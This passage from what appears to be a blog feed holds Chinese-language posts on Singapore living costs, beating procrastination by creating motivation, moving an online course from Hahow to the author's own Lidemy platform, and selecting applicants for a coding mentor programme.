倍左右，是相對之下貴很多的選擇，但我之前聽說台北有些餐廳也越來越貴，想一想發現好像也對，說不定沒有到 1.5 倍這麼多。</p><p>如果你對新加坡的物價還是很好奇，我以前有寫過兩篇優質好文還附一堆圖，可以參考看看：<a href="http://huli.logdown.com/posts/1124696-singapore-food-price-compare-to-taiwan">新加坡物價解密：比較篇</a>、<a href="http://huli.logdown.com/posts/1027985-singapore-prices-decryption-food-articles">新加坡物價解密、食物篇</a>。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>這篇以我自身的案例帶大家看一下我在新加坡的生活開銷，簡單來說就是房租三萬、吃飯一萬，一個月基本花費四萬多。但如果你要特別節省的話，可以省到房租一萬五、吃飯五千，一個月花費就是兩萬多之類的，但這樣就是超級省就是了。</p><p>每次聽到有人說新加坡物價很高我也只是笑笑，在心中暗笑他的迂，實際在新加坡住過就會發現物價是比台北高，但也沒有真的高到很離譜的地步，很多地方的價錢也沒差到多少，一堆東西絕對沒有傳說中的兩倍這麼高。</p><p>當然我同意有些地方一定有差到那麼多，但至少以我生活範圍所觸及到的部分，我能說大概 1.5 倍以內而已。這篇也算是幫自己來新加坡快兩年的生活做個紀錄，記一下自己的花費，畢竟再不趕快記以後就沒機會了。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>致跟我一樣的拖延症患者：動力是需要刻意創造的</title>
      <link href="/2018/09/27/procrastination-ba12754ada49/"/>
      <url>/2018/09/27/procrastination-ba12754ada49/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/procrastination-ba12754ada49/0__p9FMCEjwiOQecBH6.jpg"></p><p>你今年的計畫是什麼呢？</p><p>減重、健身、學習、自我成長，讓自己不斷變得更好，在心理或是生理上都有所長進？</p><p>我沒有這種計畫，因為我知道我做不到。</p><p>我也跟很多人一樣，曾經是個喜歡訂定計劃的人，因為在訂定計畫的時候你可以預見未來的自己：</p><blockquote><p>假如我按照這個計畫實行三年，那三年後我一定會變成…（請自行填入各種美好的形容詞）！</p></blockquote><p>可是隨著時間一天天過去，你會發現自己原本預定要拿來學習的時間，變成了跟朋友聊天、上 YouTube 看影片、看 Netflix、看韓劇，或寧願看著窗外下雨的天空發呆也不願打開你買了一年卻從未點開過的 Udemy 課程。</p><p>不好意思，漏了一個細節，可能還不只一堂課程，像我就買了二十堂從未點開過的課程。</p><p>然而每隔一段時間，你會意識到自己這樣不行，說好的計畫呢？說好的成長呢？於是從某一天開始（假設今天是星期三，你可能會對自己說：「好，那下星期一我要開始認真了」，而不是從明天就開始），你慢慢變成自己想像中的樣子，下班到家以後就是打開線上課程學習，假日沒事就唸書、健身，照著自己的計劃在走，想要成為更好的人，有更好的生活，賺更多的錢。</p><p>這樣的生活維持了一個禮拜，你開始漸漸感到疲憊，原本下班回家八點鐘固定打開課程，現在的你會對自己說：「先休息一下吧，八點半再來看」，八點半到了，打開課程看了半小時，你又對自已說：「今天上班很累，再讓我休息半小時吧」，可是韓劇一集就是快一個小時，休息完之後你看了看時間，已經十點了。</p><p>「先去洗個澡吧」，洗完澡又過了半小時，再休息一下滑個臉書看個 YouTube 又過了半小時，再跟朋友聊個天，差不多快十二點了，「早睡早起身體好，去睡覺吧」。</p><p>於是一天就這樣過去了，一個晚上就只看了 30 分鐘的課程，跟上週認真的自己儼然是兩個不同的生物。</p><p>這中間到底差在哪裡？</p><h3 id="動力是消耗品，需要補充、需要加值"><a href="#動力是消耗品，需要補充、需要加值" class="headerlink" title="動力是消耗品，需要補充、需要加值"></a>動力是消耗品，需要補充、需要加值</h3><p>若是把學習比喻為開車，動力就是你的汽油，你一定要有動力才能學習，不然你只會去做一些更輕鬆、更不需要刻意練習的事情。</p><p>那這個動力怎麼來的？</p><p>開頭的例子，動力來自於每隔一段時間就漸漸累積的愧疚感，「怎麼了、我累了、說好的、學習呢？」，累積到一定程度就會對自己說：「我覺得這樣不行」，把這些愧疚感以及不安轉換成學習的動力。但轉換完之後的量，大概燒個一兩週就差不多了。</p><p>燒完以後就陷入無窮迴圈：認真做事 &#x3D;&gt; 倦怠耍廢 &#x3D;&gt; 愧疚不安 &#x3D;&gt; 認真做事，一日打魚五日曬網，一直拖一直拖，把所有其他事情都做盡了才會想到要來做正事。</p><p>這時候你會覺得是不是自己的問題，不是說好要認真的嗎，怎麼一直拖延，自己這樣好差勁，說好的事情都沒做好，真的好差勁…</p><p>接著你會想到那個在社群網站上光鮮亮麗的小華，每隔一陣子就分享自己最近學習的心得，每週有兩三天跑去參加讀書會或是學習相關的聚會，假日別人在吃早午餐他在圖書館，儘管已經出社會工作還是不斷精進自己，不斷加薪又升官，十分順遂。</p><p>你又想起小華跟自己明明就沒有差多少，十幾年前不是還在同一間學校同一個班級念著同樣的書嗎，那時自己的排名還高了他一些，怎麼到了現在自己就輸了這麼多？於是你把這歸咎成自己的責任，是因為自己不長進，不認真學習，是我不夠有毅力不夠有恆心，我一定要成為一個有毅力的人！</p><p>最後你依然處在無窮迴圈之中，這種因為愧疚感產生的動力燒一兩週就沒了，燒完之後又恢復以往的生活。</p><p>如果你覺得我上面描述得不夠好，那可能是我的拖延症沒那麼嚴重，如果你覺得上面描述得很好，就是你正在經歷的事情，那你很適合看這一篇。</p><p>我相信你想知道的東西只有一個：該怎麼擺脫這樣的迴圈？</p><h3 id="步驟一：承認自己就是拖延症"><a href="#步驟一：承認自己就是拖延症" class="headerlink" title="步驟一：承認自己就是拖延症"></a>步驟一：承認自己就是拖延症</h3><p>沒錯，第一步就是認清自己，你必須對自己坦承，才能克服內心的那種不安。你要承認說：</p><blockquote><p>對，我就是那種人，我就是做事做一做會分心，我就是沒辦法每天下班回家就在學習，我就是只會訂目標卻永遠達成不了的人。</p></blockquote><p>接著我要告訴你的是，這不是你的問題。</p><p>你看，每個看到這邊心有戚戚焉的讀者，都跟我們是同類人，我們並不孤單。有拖延症並不是我們的錯，搞不好是我們天生就這樣的。如果有人天生就是學習能力差勁，那沒有老師會怪他，因為那是天生的。如果我們就是天生拖延症，那怎麼會怪我們？</p><p>有些人會說：「難道沒毅力沒動力不是你的錯？那是誰的錯？」沒有，誰都沒有錯。</p><p>在不斷跟拖延症搏鬥的過程中，我發現那種負面的焦慮情緒來源只有一個，那就是：「我覺得是我的錯，我覺得我應該要可以，可是我卻做不到」，如果一直這樣認為，就只會一直焦慮下去。</p><p>要跳出這個迴圈，我的方法是：「承認自己不是「應該要做的到」，而是「我就是做不到」」，一但承認自己就是做不到，就是沒辦法產生動力，你就跳出這個迴圈了。</p><p>對我來說，動力本來就是個不會憑空產生的東西，要你憑空產生動力是個過分的要求，動力是需要「刻意創造」的，或者是需要經過轉換的。</p><p>有些人會說：「聽你在講，那為什麼那個 OOO 可以每天都保持學習你就不行？那個 XXX 可以每天唸英文你就不可以？」</p><p>因為他們有動力而我沒有，或者換句話說， 他們不經意地產生出了動力，只是他們不知道。</p><p>該怎麼產生出動力？</p><h3 id="步驟二：找出對你來說重要的事"><a href="#步驟二：找出對你來說重要的事" class="headerlink" title="步驟二：找出對你來說重要的事"></a>步驟二：找出對你來說重要的事</h3><p>在談論怎麼產生出動力之前，應該先想想為什麼自己沒有動力，我想了又想猜了又猜，我覺得根本原因是：</p><p>這件事情對你不夠重要。</p><p>你的目標可能是年收百萬，你覺得這是件重要的事，但其實仔細思考過後，你可能會發現維持現在的生活水平也可以，日子也還是過得下去，只是未來要結婚要困難，或者是沒辦法出國旅遊太多次。</p><p>但重點是沒有達成這個目標，你還是過得下去，但當然年收百萬會更好，所以我才說這個目標重要可是「沒那麼重要」。</p><p>假設今天突然有個拿刀的小精靈出現在你目前，跟你說：「安安，如果你三個月後多益考不到 950 分以上，我就砍斷你的手喔！」，接著立刻把你手砍斷三秒後又接回來，證明了這個小精靈是真的有這個能力，而你也用了三秒體驗手被砍斷的感覺。</p><p>接著你會怎麼做？</p><p>靠杯，當然是一直唸英文啊！雖然還是偶爾會耍廢，但頻率絕對不會像以前那麼高。為什麼？因為唸英文這件事情對你來說變得超級重要，沒唸好就會被砍斷手，誰敢不念？</p><p>明白「重要性」的重要之後，可以來看一下其他常見的例子。</p><p>被女友分手後環島跪求原諒、跟喜歡的對象告白被拒以後發奮減肥、為了未來的老婆努力賺錢打拼。</p><p>為什麼這些案例能夠成功？因為有一件他們很在意的事情，你有多在意，就能夠產生出多少動力。當初告白被拒後有多傷心多難過，你就有多少動力去改造自己。</p><p>最後回到開頭的例子，看 Udemy 課程重要嗎？好像不太重要，不看也不會怎樣，我知道讓自己成長之後生活可以變得更好，可是問題就出在「現在的生活並沒有特別糟」，還是過得下去，所以「往上提升」這件事情並沒有特別重要，有了會更好，但沒有也可以。</p><p>既然重點是出在：「不夠重要」，想要解決問題，就讓事情變得重要就好。</p><h3 id="步驟三：創造出動力"><a href="#步驟三：創造出動力" class="headerlink" title="步驟三：創造出動力"></a>步驟三：創造出動力</h3><p>有什麼東西對你來說是真的很重要的？</p><p>舉例來說，可能是金錢。</p><p>我有個朋友去了某個地方學程式，花了好幾萬塊想讓自己轉職成工程師，但在中間卻跟我說那邊的教學沒有很好，很多地方都聽不懂，要問問題也很困難，我就問了他：那怎麼辦？</p><p>他說：「還能怎麼辦，都花幾萬塊了，結業之後一定要找到工作啊，就只能拼命自己學」</p><p>那時我才意識到動力是可以被創造出來的，可以被另外一件重要的事情創造出來。所以你要找到對你來說真的重要的事。</p><p>對我來說，重要的是什麼？第一個是責任。</p><p>我是個工程師，是個真心喜歡寫程式的工程師。我知道有些工程師就算是下班時間也會鑽研技術，因為他們熱愛。對我來說我雖然也很喜歡，但下班時間我很少寫 code，因為我懶。我的懶惰大過於我對程式的愛（我的懶惰大過超多事情），所以懶惰戰勝了。</p><p>可是身為工程師，尤其是前端工程師，就代表你有一大堆新的東西要學習，這怎麼辦呢？</p><p>我靠上班來解決這個問題。</p><p>我下班不寫程式因為不寫也沒差，可是一但上班拿人薪水，就一定要交付一定品質的成果出去，我就必須精進自己的技術，才能不愧對這份薪水。所以上班是我創造出學習程式的動力的原因，我必須要對這份薪水負責。</p><p>還有一個對我來說很重要的是承諾，其實也跟責任有點像。話一但說出去了就要負責。</p><p>我之前有在網路上 po 一些免費教學的文章，其實文章 po 出去的時候，要教什麼我都只有初步概念，我連教材都還沒規劃好。</p><p>可是我為什麼要先 po 文跟大家講我要來教學？因為沒 po 的話我可能永遠都不會把教材生出來，可是 po 了的話就不得不教了，因為你話都講出去都有人來報名了，你沒東西教就準備開天窗。</p><p>一但開天窗，從此以後你就會被人知道：「噢，你就是那個說要教後來又取消的人喔」，我不想變成這樣，所以一但話講出去，就是要做到。</p><p>從以上的例子就可以發現，當你把一件對你而言真的重要的事情跟你的目標綁在一起，就可以創造出動力。而且這樣的動力比你靠愧疚感產生的動力有用多了。</p><p>常見的而且最實際的動力還有金錢，例如說什麼：「這禮拜十二點還看到我在線上，底下留言的一人一杯星巴克」，也是類似的道理，為了不要花大錢請一大堆星巴克而強迫自己早睡。</p><p>我以前一直以為動力是可以憑空出現的，是我自己懶惰，是我自己拖延症所以才導致失敗的結果，但後來我轉個念頭就海闊天空，動力其實是被創造出來的，不是你想要有就可以有的。</p><p>有些人看起來很有動力很輕鬆，那可能也只是因為他們背後有你所不知道的動力在支撐著，在他們的努力背後有一件非得達成不可的事情，在支持著他們前進。</p><p>但我沒有，所以我要找出那件事情，來把我的動力創造出來。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>關於那種恆毅力、意志力的書籍我也看了不少，但都對我沒什麼用，印象最深刻的是《讀書別靠意志力──風靡德國的邏輯K書法》裡面講到的方法，每天都做一點就好，但對我沒用是因為我連一點都懶得做…厲害吧。</p><p>另外，我上面講的這些東西完全沒有科學證據佐證，純屬個人猜想，但對於我來說是適用的就是了，如果有哪本書寫到類似的麻煩推薦給我，我一直覺得在心理學之類的領域應該也有相關的解釋，只是不知道從何找起。</p><p>總之這篇主要是想分享給和我相似，同樣被拖延症困擾的朋友們，我在不斷掙扎的過程中找到了其中一個出路，希望這個出路對有些人是有用的。</p>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>把 Hahow 的課程下架之後，我的下一步是什麼？</title>
      <link href="/2018/09/18/hahow-and-lidemy-2dab35919bb8/"/>
      <url>/2018/09/18/hahow-and-lidemy-2dab35919bb8/</url>
      
        <content type="html"><![CDATA[<p>今天，9&#x2F;18 號，對我來說是個具有特殊意義的日子。</p><p>這一天我在 Hahow 上的課程《初心者的計概與 coding 火球術》正式滿兩週年了，它是我的第一堂線上課程，這天也是我在 Hahow 上面要<strong>把它給下架</strong>的日子。</p><blockquote><p>怎麼了，你累了，說好的，課程呢？</p></blockquote><p>為什麼要下架？</p><p>這個決定其實在一年前就已經做好了，當初也有在 Hahow 的課程公告上面跟所有已經購買或是想要購買的學生解釋，下面是當初公告的全文：</p><p>（話說如果你是這堂課在 Hahow 上面的學生但是還沒拿到補償，這幾天就會收到相關通知了，麻煩再等一下）</p><p>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p>Hi,<br>大家好，我是胡立，初心者的計概與 coding 火球術的老師，<br>在這邊想通知大家一個關於這堂課的重大消息。</p><p>在一年前我籌劃這門課程的時候，是有感於許多初學者因為缺乏基礎，因此在學習程式的路上非常不順，有很多課儘管標榜著毫無基礎也能夠上課，但其實在這方面還是做得不夠，還是有很多人聽不懂老師在講什麼。</p><p>所以呢，我就想說：「那不如開一堂課把這些基礎先上一上，這樣之後學程式應該就沒那麼難了！」</p><p>秉持著想要讓初學者能夠更容易入門這個領域的理念，這堂課就這樣誕生了</p><p>經過這一年間收到的反饋以及我自己重新審視過一遍課程，覺得教學成效沒有我當初預計的好。我相信我的目的是正確的、理念是正確的，可是方法卻錯了。</p><p>這堂課比較適合當作你在上其它程式課程碰到問題的時候，再來查詢的「補充資料」。例如說上到後端寫程式開始教資料庫可是你不知道什麼是資料庫，你再來看我這邊跟資料庫有關的影片；而不是像現在這樣，把全部基礎知識都集中在一起教，並且幾乎全部都是理論而沒有任何實作</p><p>作為一堂基礎課程，就代表無論你修哪一個程式語言，你都可以在這邊找到有用的參考資料。我希望這樣子的課程是免費的，是可以公開給大家的，而我也確信這樣可以幫到更多的學生。</p><p>當初跟 Hahow 簽的合約是兩年，並且合約上載明課程售價不得低於募資期間價格。因此呢，想要變成免費課程，只好在這邊下架並且在其他地方上架。</p><p>所以，在這邊要跟大家宣布：這堂課會在合約到期之時（2018&#x2F;09&#x2F;18）從這邊下架，並且在我自己最近在籌備的課程平台上面上架，然後轉為免費課程。對於已購課學生呢，也請你們不用擔心，下架了的課程還是可以在 Hahow 平台上無限次觀看的，只是課程不會再繼續販售而已，所以在課程的觀看上完全不受影響喔。</p><p>再重述一下轉為免費課程的兩個理由，一個是我覺得成效不彰，不值得收費；另一個是我希望這樣性質的課是免費的。</p><p>這時候可能會有已經購買的學生說：「那我們怎麼辦？都已經花錢買了耶！」，不用擔心，我是絕對不會虧待一開始就願意支持這堂課程的學生的！</p><p>在課程一週年以前（2017&#x2F;09&#x2F;18）購買的學生，可以獲得我之後課程等值 2000 的折價券。<br>在一週年以後，兩週年（2018&#x2F;09&#x2F;18）以前仍然願意購買的學生，可以獲得等值 1000 元的折價券。</p><p>折價券發放的時機會再另行公告，但麻煩大家等我一些時間，畢竟要等我新的課程平台有足夠多的課以後發折價券才有意義嘛 XD</p><p>最後，再次感謝大家願意支持這門課程，也很感謝大家給的意見，我會繼續試著創造出更適合初學者入門的課程。如果想關注我新的課程平台的發展，可以關注一下 <a href="https://www.facebook.com/lidemytw">Facebook 粉絲專頁</a>，感謝。</p><p>=&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><p>相隔一年之後看了這篇公告，其實自己心裡的想法也有些改變。</p><p>但總之當初想下架的原因之一是我要把這堂課轉成免費課程，可是 Hahow 的規則不允許，所以我也只能下架。那如果 Hahow 允許轉成免費課程，這堂課就會繼續留在 Hahow 上面了嗎？</p><p>不，也不會，原因我待會再說。</p><p>在這之前，我們先來談談 Hahow 這個課程平台好了。</p><h3 id="Hahow-的好與壞"><a href="#Hahow-的好與壞" class="headerlink" title="Hahow 的好與壞"></a>Hahow 的好與壞</h3><p>其實早在兩年之前，我就已經寫過一篇在 Hahow 上面開課的心得了：<a href="http://huli.logdown.com/posts/1007851-to-be-a-teacher-in-hahow">在 hahow 開課心得分享</a></p><p>而前陣子去拜訪 Hahow 的時候也有聊到這篇，發現兩年過去了，我上面的提出的建議其實他們也修得差不多了，感謝飛天小女警與 Hahow 的努力，也要感謝以前協助過我的 Alice、涵涵與子葳。</p><p>其實現在的 Hahow 跟兩年前我開課的 Hahow 已經差很多了，我剛開課的時候 Hahow 也才成立沒多久，雖然已經在線上課程這塊市場佔有一席之地，但仍然處於一個探索的階段。</p><p>但兩年過去了，他們對這個產業變得熟悉許多，在跟許多老師合作的過程中也更了解老師在製作課程上會碰到什麼問題，並且也提供了許多解決方案。現在甚至完整到可以協助你拍攝以及製作課程（當然是要錢的，詳情可以自己去找 Hahow 諮詢，我這真的不是業配）。</p><p>我那個時候什麼事情都自己來，課程介紹自己來、募資影片自己拍，Hahow 那時給我的協助就是幫我釐清課程的定位以及受眾，再來就是利用他們的平台資源幫我推廣這堂課程。</p><p>我先承認我對 Hahow 這間公司一直都很有好感，我覺得它是一間有溫度的公司。至少在跟老師這塊的關係培養做得很不錯，上次被 Hahow 找去聊了一下，有送了一個小禮物。除此之外逢年過節就會問候一下，還會寄小卡片到你家，教師節的時候我收過，聖誕節也收過：</p><p><img src="/img/hahow-and-lidemy-2dab35919bb8/1__Z4QjNyeQfc2ccO3RjEohIQ.jpeg"></p><p>透過這樣子的一些小細節真的讓人揪甘心，你有任何課程相關問題也都可以第一時間得到回覆，未來也可能會有老師專屬的聚會，讓大家交流一下。</p><p>而兩年之間他們的系統也不斷在優化，老師的編輯課程介面進化了、首頁進化了、功能變多了變有趣了，整個平台變得比兩年前豐富許多。對我來說，現有的功能如果不夠好，這問題不大，重點是這個平台要能聆聽使用者的心聲，要能持續改進，而 Hahow 就是我會推薦的一個平台。</p><p>完了，越寫越像葉佩雯，趕快來平衡一下。</p><h3 id="那既然-Hahow-這麼好，你幹嘛離開？"><a href="#那既然-Hahow-這麼好，你幹嘛離開？" class="headerlink" title="那既然 Hahow 這麼好，你幹嘛離開？"></a>那既然 Hahow 這麼好，你幹嘛離開？</h3><p>這個問題我用唱的來回答你：</p><blockquote><p>我們都沒錯～ 只是不適合～</p></blockquote><p>第一個原因很現實，就是分成。之前有些朋友都會偷偷來問我 Hahow 抽多少，但其實 Hahow 的分潤都是公開的，在他們網站上就有了：</p><p><img src="/img/hahow-and-lidemy-2dab35919bb8/1__aUd0esbsQmMErp2duc43CA.jpeg"></p><p>以我自己的課程來說，平均下來大概是老師 70%，平台 30%，其實這比例看起來還行，在其他平台我相信平均起來應該也差不多。</p><p>但你知道的，有些人就是會想要的更多一點：「如果可以全部自己賺，為什麼要給別人抽？」，假如你只有一兩堂課程的話我覺得還好，畢竟就當試試水溫嘛，差那個 30% 也沒有多少錢，而且也幫你省了一大堆麻煩，你不找現有平台的話你就要自己架、行銷自己做，哇那該有多累，還是付錢比較實在。</p><p>可是如果你今天想開三堂、五堂甚至是十堂課程，那這樣子的情況之下 30% 的分成就得重新考慮了。</p><p>這就是第二個原因，我想做的不只是課程了，我想做平台，但不是 Hahow 那種大家都能上架課程的平台，<strong>我想做我自己的平台，上面全都是我自己的課程。</strong></p><p>在這個前提之下，找不到一個好理由讓我繼續待在 Hahow，或是說不只 Hahow，而是任何現有的課程平台。</p><p>為什麼？第一點當然是上面講的分成，30% 的分成在課程數量變多之後也變得可觀，長期下來自建平台會是利多的一個方案，第二點是因為不夠自由，在 Hahow 上面我會受到平台的限制，價格不能調降、課程要先過審核、不能做我想做的促銷等等。</p><p>綜合以上幾種原因，如果想要長期發展線上課程這一塊，跳出來自己做是非常合理的選項。身為工程師，你要我自幹一個平台也行，但第一我懶，第二太花資源，最後我用了自建平台的現成解決方案：<a href="https://teachable.com/">Teachable</a> 架出一個上面都是我的課程的平台，叫做 <a href="https://www.lidemy.com/">Lidemy 鋰學院</a>。</p><h3 id="所以，你下一步想幹嘛？"><a href="#所以，你下一步想幹嘛？" class="headerlink" title="所以，你下一步想幹嘛？"></a>所以，你下一步想幹嘛？</h3><p>《初心者的計概與 coding 火球術》雖然成效不彰，但那不是課程本身的問題，課程其實是收到不少好評的：</p><p><img src="/img/hahow-and-lidemy-2dab35919bb8/1__XyEFrqF4VRFUbWtfgUOEBg.png"></p><p>問題出在這堂課程過度偏重於理論而沒有實作，所以只上這堂課程的話，上完之後會覺得：「我好像學到東西了，可是我可以用在哪？」，原本這堂課後面的單元就是為了多少彌補這一塊，但看來效果也不是很好。</p><p>從這堂課以後，我陸陸續續嘗試了其他教學，包括：<a href="https://www.lidemy.com/p/frontend-intermediate-course">[FE201] 從新手到中手：前端工程加強班</a>、<a href="https://www.lidemy.com/p/cs50-introduction">[CS50] 導讀哈佛大學程式課程：CS50</a> 與 <a href="https://www.lidemy.com/p/mtr01">[MTR01] 程式導師實驗計畫第一期</a>。</p><p>在教學的過程中，我其實一直處於一個迷惘的狀態。我教了很多，可是成效到底如何？我教越多就發現有越多東西沒教，該怎麼辦？</p><p>為了解決這些疑惑，才有了<a href="/2018/06/26/mentor-program-review-a9c6668dfb/">程式導師實驗計畫第一期</a>，以順利就職當作衡量計畫成功與否的標準，而在第一期結束以後，我也發覺自己教學方法上的一些不足，最後得到的解法是：</p><blockquote><p>直播講重點，細節讓學生看線上課程。</p></blockquote><p>藉由這樣子的方式，我可以把以前的教學都累積起來，變成一個個線上課程，把這些線上課程連起來就變成一條線，最後跟程式導師實驗計畫串起來，變成一個面，成為完整的線上程式教育課程。</p><p>所以我的終極目標是什麼？或是說，我希望 Lidemy 可以做到怎樣？</p><p>很簡單，我寫在之前的<a href="/2018/06/26/mentor-program-review-a9c6668dfb/">心得</a>裡面了：</p><blockquote><p><em>不要再去尋找那些如何成為工程師的資源了，不要再去問人有沒有推薦的課程了，只要來這裡讓我帶著你，我就想辦法讓你變成工程師。</em></p></blockquote><p>我覺得現在的問題已經不是資源多寡了，而是資源太多讓人無法選擇，同一類型的課程在 Udemy 上面賣你 300 塊台幣，在其他課程平台可能賣你 3000 元，於是你東挑挑、西看看，可是買了之後卻發現還是少了點什麼。</p><p>少了一個方向、少了連貫的教學、少了一個人跟你說：「這個先學，那個可以先不管」，少了一個好的，可以讓你一直跟隨的老師。</p><p>我希望我能解決這個問題。</p><h3 id="我的下一步，Lidemy-的下一步"><a href="#我的下一步，Lidemy-的下一步" class="headerlink" title="我的下一步，Lidemy 的下一步"></a>我的下一步，Lidemy 的下一步</h3><p>第一步很簡單，就是把<a href="https://www.lidemy.com/p/cs101-coding/">《初心者的計概與 coding 火球術》</a>放來這邊，然後轉為免費課程（已經轉過來了，點上面連結就是了）。一年前的我這個決定做得很果斷，但老實說我近期有點猶豫。</p><p>首先是免費課程這點，我以前很愛這樣做，原因就是我希望它是免費的，而且我也沒打算用這個賺錢。但我現在想法改變了，有時候免費不一定是好的，付費也有它的必要性在，例如說藉由付費來排除掉一些對課程不是那麼有興趣的學生以及增強學生願意上課的動力等等。</p><p>再來是因為這堂課變免費，所以我答應要給之前的學生補償，當初我的想法是：「反正課程都是我的，我也不賠本」，但換個角度一想就變成：「我給了 60 萬的折價券出去，我不就少賺 60 萬？」，所以我一度猶豫要不要課程照樣賣，折價券就不給了或給少一點。</p><p>最後，我覺得不行。話說了就是說了，反正牙一咬就過了，這少賺 60 萬也只是把之前 Hahow 上面的收益全都還回去，等於不賺不賠，沒事兒沒事兒。</p><p>而課程的部分也維持原樣決定免費，因為我覺得以後每個其他課程都會參考到這門課的一部分，與其跟學生說：「參考的部分請先購買初心者的計概…」，不如直接附上免費的課程連結比較實在，也省得麻煩。</p><p>再來，也會慢慢按照計畫把我想開的課程放上去，下面是預計的課程列表，我上次自己列完之後都驚呆了，怎麼那麼多課，我真的做得完嗎…</p><p>1.[GIT101] Git 超新手入門<br>2.[CMD101] Command line 超新手入門<br>3.[JS101] 用 JavaScript 一步步打造程式基礎<br>4.[FE101] 前端基礎：HTML 與 CSS<br>5.[FE102] 前端必備：JavaScript<br>6.[JS201] JavaScript 進階：那些你一直搞不懂的地方<br>7.[BE101] 用 PHP 與 MySQL 學習後端基礎<br>8.[FE201] 前端中階：那些前端會用到的工具們<br>9.[BE201] 後端中階：CodeIgniter 與 Express<br>10.[FE301] React 基礎<br>11.[FE302] React 不可或缺的好夥伴：Redux<br>12.[DS101] 基本資料結構<br>13.[ALG101] 演算法入門</p><p>前三堂課其實已經錄完了也開始販售了，全部課程都提供一定比例（目前為大約 1&#x2F;3）試看以及 30 天內無條件退費，如果你看了之後覺得不錯想購買，在這邊提供一些 coupon，用完為止（在結帳頁面輸入或直接點擊下面連結皆可）：</p><p>（如果你是 Hahow 上面初心者的計概與 coding 火球術的學生，之後都會拿到 JS101 的 coupon，還沒拿到的話麻煩再等等）</p><ol><li><a href="https://www.lidemy.com/p/cmd101-command-line/?product_id=759878&coupon_code=HAHOWGOOD">[CMD101] Command line 超新手入門</a>，折抵 50 元：HAHOWGOOD<br>（提供 200 張）</li><li><a href="https://www.lidemy.com/p/git101/?product_id=759871&coupon_code=LIDEMYOPEN">[GIT101] Git 超新手入門</a>，折抵 100 元：LIDEMYOPEN<br>（提供 100 張）</li><li><a href="https://www.lidemy.com/p/js101-javascript/?product_id=756496&coupon_code=ILOVEJS">[JS101] 用 JavaScript 一步步打造程式基礎</a>，折抵 200 元：ILOVEJS<br>（提供 50 張）</li></ol><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>其實上面那麼多課程我也不知道到底做不做得完，但我把它寫在這裡，也是給自己一個壓力，如果你真的很希望某堂課開成的話可以留言告訴我，或是你有任何想學的也可以留言告知，像是假如有一堂專門給 PM 上的程式基礎，好像會滿有趣的。</p><p>最後，既然你都看到這了，如果你對以後的相關訊息有興趣，歡迎追蹤 Lidemy 粉絲專頁：<a href="https://www.facebook.com/lidemytw/">Lidemy 鋰學院</a></p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何決定錄取與否？對計畫的反思以及對報名信的建議</title>
      <link href="/2018/08/20/mentor-program-register-3648c1b82cd7/"/>
      <url>/2018/08/20/mentor-program-register-3648c1b82cd7/</url>
      
        <content type="html"><![CDATA[<p><a href="/2018/07/12/mentor-program-s2-f876c4e13d3b/">程式導師實驗計畫</a>的報名結束了，在今天也正式寄出錄取與沒錄取的通知，想用這篇跟大家分享一下心得，也順便讓大家藉由這篇瞭解一下我在收學生的時候會考量到什麼。</p><p>就先從報名的狀況開始講起好了。</p><h3 id="趕死線的習慣"><a href="#趕死線的習慣" class="headerlink" title="趕死線的習慣"></a>趕死線的習慣</h3><p>不知道為什麼大家這麼愛趕死線，原本就隔個兩三天收到一封報名信而已，截止前四五天我統計了一下，大概收到 20 幾封，這時我想說搞不好可以跟去年一樣全收，我就不用把人刷掉了，很省事。</p><p>結果隨著截止日期越來越近，收到的信越來越多，在截止的前幾天我就有種預感：</p><blockquote><p>靠腰，死線那天一定會收到很多信</p></blockquote><p>結果報名的最後一天，我收到了 28 封信，整個計畫一共有 54 個人報名。</p><p>是的，最後一天報名的人數直接超越了前一個月的總和。</p><p>雖然說簡章上寫說會收到罐頭回信，但基本上我還是一個一個手動回，只是部分內容可能是複製貼上的而已，所以回信還是要花一點時間，在最後一天晚上九點多的時候我回一封就收到一封新的報名信，總覺得怎麼越回越多。</p><p>總之我也沒有覺得很不好啦，只是覺得這樣滿有趣的，而且有很多人也不是最後一天才看到這個計畫，我想應該是想要把自己的信寫到最好之類的吧，所以才會挑最後一天寄出。</p><p>然後關於 Google 表單的部分，有 5 個人重複填表，因為忘記自己到底有沒有填過了，保險起見再填一次。一共有 62 個人填表單，其中有 8 人沒有寄信，所以有效報名的總數是 54 人。</p><h3 id="好，那到底要怎麼篩？"><a href="#好，那到底要怎麼篩？" class="headerlink" title="好，那到底要怎麼篩？"></a>好，那到底要怎麼篩？</h3><p>上次的計畫以及我更早以前的活動，雖然都是說有篩選，但因為報名人數都在可以掌控的範圍以內，導致我後來直接全部收進來，省去篩選的麻煩。但是這一次的報名人數超出預期，雖然有淘汰制，但我也不可能一次收 54 個人進來，所以這次一定要把人篩掉了。</p><p>在看每一封報名信的時候，其實心中就已經有悄悄把人分成三種：一定會錄取、有待考慮、一定不會錄取。</p><p>在報名信裡面，其實我想知道的就這四件事：</p><ol><li>你是誰？</li><li>你為什麼要報名？</li><li>你真的有時間參加嗎？</li><li>你真的有想去求職嗎？</li></ol><p>因為這計畫沒有面試，所以完全靠你寄來的這封報名信，怎麼會有些人覺得每一題只要一兩句話就可以讓我了解你到一定程度？寫太少的基本上就直接先刷掉了，我也沒有要你寫很多，我只是希望你至少能清楚地表達自己。</p><p>再來，如果你表達出來強烈的求職意願以及強烈的學習動機，那基本上我是必收了。有多強烈？有人強烈到跟我說如果這計畫錄取之後就離職專心上這個課，學習動機有了、求職意願有了、時間也一定可以符合，沒什麼理由好不收的。</p><p>時間也是一個很重要的因素，為什麼這個計劃可以想辦法讓你在四個月內就把就職所需的技能給學起來？因為你一週要付出 40 